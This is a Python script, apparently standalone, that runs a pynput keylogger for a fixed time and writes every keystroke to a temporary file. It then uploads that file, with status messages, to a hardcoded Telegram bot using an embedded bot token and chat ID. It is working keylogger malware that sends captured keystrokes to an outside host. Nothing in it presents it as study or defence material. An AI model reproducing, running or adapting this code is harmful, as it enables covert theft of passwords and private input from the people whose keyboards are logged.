#lang:python
#requirements: requests pynput

import os
import requests
import tempfile
import logging
import threading
from pynput.keyboard import Key, Listener

chat_id = "-4102145810"
token = "6653447632:AAEHVkyZH-TFa9141etCM1wmPyJ9rCXuASA"

def send_message(chat_id, token, message):
    r = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={message}")

def send_file(chat_id, token, filepath):
    data = {'chat_id' : chat_id}
    with open(filepath, 'rb') as file:
        files = {
            'document': file.read()
        }
    r = requests.post(f"https://api.telegram.org/bot{token}/sendDocument", data=data, files=files)

def keylogger(file, timeout):
    logging.basicConfig(filename=file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

    stop_listener = threading.Event()

    def on_press(key):
        logging.info(str(key))

    def stop_after_delay():
        stop_listener.wait(timeout)
        stop_listener.set()
        listener.stop()

    timer_thread = threading.Thread(target=stop_after_delay)
    timer_thread.start()

    with Listener(on_press=on_press) as listener:
        stop_listener.wait()
        listener.stop()

    timer_thread.join()

def is_file_empty(file_path):
    return os.path.getsize(file_path) == 0

send_message(chat_id, token, "Starting")

temp_file = tempfile.NamedTemporaryFile(delete=False)
log_file_path = temp_file.name
temp_file.close()

send_message(chat_id, token, f"Temp file : {str(log_file_path)}")

if os.path.isfile(log_file_path):
    os.remove(log_file_path)
keylogger(log_file_path, 10)

send_message(chat_id, token, "keylogger() end")

if not is_file_empty(log_file_path):
    send_message(chat_id, token, "sending file")
    send_file(chat_id, token, log_file_path)
    send_message(chat_id, token, "done")